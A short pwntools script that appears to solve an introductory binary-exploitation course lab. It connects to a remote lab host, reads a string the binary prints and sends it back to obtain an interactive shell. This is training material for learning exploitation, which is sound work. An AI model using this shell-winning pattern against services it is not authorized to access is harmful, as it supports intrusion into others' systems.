import pwn

if __name__ == "__main__":
    
    # Creating a tube to run the binary to "exploit"
    # The first option is for testing a local binary; the second is for running against a remote service
    # victim_binary = pwn.process("./lab1-1.bin")
    victim_binary = pwn.remote("csc748.hostbin.org", 7011)

    # Read and drop the introductory text printed to the screen by the binary
    victim_binary.recvuntil(b"\n\n")

    # Read and save the string given which will win a shell
    shell_winning_string = victim_binary.recv(15)

    # Return the shell winning string to the binary
    victim_binary.sendline(shell_winning_string)

    # Drop into a shell
    victim_binary.interactive()